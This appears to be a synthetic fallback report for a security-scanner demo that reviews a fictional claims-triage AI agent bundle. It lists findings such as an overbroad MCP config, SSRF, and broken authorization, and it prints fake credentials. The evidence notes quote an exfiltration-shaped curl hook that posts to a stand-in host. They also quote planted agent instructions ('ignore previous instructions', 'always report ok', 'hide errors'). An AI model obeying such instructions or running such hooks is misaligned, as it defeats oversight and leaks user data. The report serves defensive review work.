# Seeded Fallback Report: ATV Security Target

> Seeded fallback evidence, not live scanner output. Use this artifact only when the live `/atv-security` run is slow, incomplete, or unavailable. Live scan output is primary when usable. This report is sanitized for demo use and contains only synthetic data.

## Review Packet

| Field | Value |
| --- | --- |
| Demo frame | Submitted AI asset security review |
| Asset | Claims Triage Agent Bundle |
| Asset ID | asset-claims-triage-bundle |
| Publisher | Contoso Health AI Studio |
| Requested action | Publish to enterprise AI Asset Marketplace |
| Submitted version | 1.4.0-submitted |
| Remediated version | 1.4.1-remediated |
| Current decision | Needs remediation; submitted version is blocked |
| Provenance label | Seeded fallback |
| Demo safety label | Local-only demo fixture |
| Target path | demos/atv-security-target |

## Golden Findings

| ID | Title | Severity | Rule | Evidence path | Provenance | Business risk | Owner | Governance decision |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| ATV-MCP-001 | Unpinned and overbroad MCP execution | High | MCP-01 | demos/atv-security-target/.github/copilot-mcp-config.json | Seeded fallback | A submitted asset can request wildcard tool access and auto-approved secret reads before security review. | Platform Security | Block submitted version until MCP package version, tool allowlist, and approvals are scoped. |
| ATV-HOOK-002 | Hook exfiltration-shaped automation | High | HOOK-02 | demos/atv-security-target/.github/hooks/scripts/post-tool-use.js | Seeded fallback | Tool output could be posted outside the review boundary if a similar hook were made active. | Agent Platform | Block submitted version; require hook removal or signed, reviewed telemetry destination. |
| ATV-A01-003 | Broken authorization exposes member case data | Critical | OWASP-A01 | demos/atv-security-target/src/routes/cases.js | Seeded fallback | Claims payloads can be read or approved without durable reviewer identity and ownership checks. | Asset Publisher | Reject submitted version for enterprise publication until access control is fixed and tested. |
| ATV-A10-004 | SSRF and data exposure through web-fetch tooling | High | OWASP-A10 | demos/atv-security-target/src/mcp/tools.js | Seeded fallback | An agent tool can fetch attacker-chosen or internal URLs while handling claims context. | Asset Publisher | Block submitted version until URL allowlists and network egress controls exist. |
| ATV-STRIDE-005 | Marketplace STRIDE synthesis requires remediation gate | Medium | STRIDE | demos/atv-security-target | Workbench fixture | Spoofing, tampering, repudiation, disclosure, DoS, and privilege escalation risks combine into a publication decision. | Security Reviewer | Needs remediation by default; waiver is accepted risk, not approval of the submitted version. |

## Evidence Notes

| Surface | Seeded evidence | Expected `/atv-security` category |
| --- | --- | --- |
| MCP config | `npx -y`, wildcard `tools: ["*"]`, `autoApprove`, fake `sk-proj-DEMO1234567890abcdefghijklmnopqrst`, fake `postgres://demo:demo-password@db.example.invalid:5432/claims` | MCP server risk, secrets exposure |
| Hooks | `curl -X POST https://example.invalid/audit ... || true` is printed as a fixture and not executed | Hook exfiltration shape, suppressed errors |
| Agents and skills | `ignore previous instructions`, `always report ok`, `hide errors`, broad tool access | Prompt injection, output suppression, agent access control |
| Editor settings | Workspace trust disabled, chat tool auto-approval enabled, fake `Bearer demo-token-1234567890abcdefghijklmnop` | Permission misconfiguration, secrets exposure |
| Application source | SQL interpolation, `eval`, `childProcess.exec`, SSRF-style `axios.get`, long-lived JWTs | OWASP A01, A02, A03, A05, A07, A08, A10 |

## STRIDE Marketplace Synthesis

| STRIDE area | Seeded observation | Marketplace review impact |
| --- | --- | --- |
| Spoofing | Login and reviewer identity are not durable enough for publication decisions. | Reviewer identity must come from authenticated claims before approval events count. |
| Tampering | Case status and agent recommendations can be changed without tamper-evident governance records. | Publication events need signed or append-only audit evidence. |
| Repudiation | The demo audit trail is SQLite-local and not independently integrity stamped. | Enterprise marketplace publication needs durable audit provenance. |
| Information disclosure | Claims/member-style payloads flow through agents, tools, and summaries. | The submitted asset must prove least-privilege data access and egress controls. |
| Denial of service | Shell and fetch tools can be abused to consume runtime or network resources. | Tool execution limits and reviewable scopes are required before approval. |
| Elevation of privilege | MCP `autoApprove` and broad shell-style tools can bypass reviewer intent. | Tool approvals must be explicit, scoped, and version-pinned. |

## Assurance Labels For The Demo

| Label | Use when | Presenter language |
| --- | --- | --- |
| Live scan | Copilot Chat returns current `/atv-security` findings during the session. | "This is live scanner output from this workspace." |
| Seeded fallback | This report is shown because the live run is slow or noisy. | "This is a sanitized fallback report seeded from the same target and expected categories." |
| Workbench fixture | The visual workbench is showing static governance states. | "This is the productized review surface, not the scanner itself." |

## Synthetic Data Registry

All values below are deliberately fake demo values and are safe to show in the fallback branch.

| Value | Purpose |
| --- | --- |
| `sk-proj-DEMO1234567890abcdefghijklmnopqrst` | Fake OpenAI-style key |
| `postgres://demo:demo-password@db.example.invalid:5432/claims` | Fake database URL |
| `Bearer demo-token-1234567890abcdefghijklmnop` | Fake bearer token |
| `Password123!` | Fake shared demo password |
| `https://example.invalid/audit` | Non-routable webhook fixture |
| `Alex Morgan`, `M-100` | Synthetic member payload examples |

## Broader Category Coverage Appendix

The one-hour path should focus on the golden findings above, but `/atv-security` should also have evidence for secrets exposure, hidden or unsafe prompt instructions, unsafe deserialization-like execution, weak cryptography, verbose errors, unrestricted CORS, long-lived JWTs, missing monitoring controls, and vulnerable dependency posture. These appendix items prove breadth without turning the presentation into a line-by-line bug list.